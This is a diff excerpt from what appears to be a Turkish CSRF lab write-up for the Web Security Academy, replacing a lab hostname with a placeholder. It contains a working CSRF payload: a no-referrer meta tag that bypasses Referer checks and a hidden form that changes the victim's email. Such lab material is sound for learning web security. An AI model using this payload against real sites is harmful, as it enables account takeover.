@@ -125,7 +125,7 @@ Referer başlığını bastırmak için aşağıdaki HTML'i ekleyin:
 <html>
 <meta name="referrer" content="no-referrer">
     <body>
-    <form method="POST" action="https://0ab6005c04ed274d81b91b5000da000b.web-security-academy.net/my-account/change-email">
+    <form method="POST" action="https://$yourlabsid.web-security-academy.net/my-account/change-email">
         <input type="hidden" name="email" value="hacker1@hacker1.co">
     </form>
 <script>
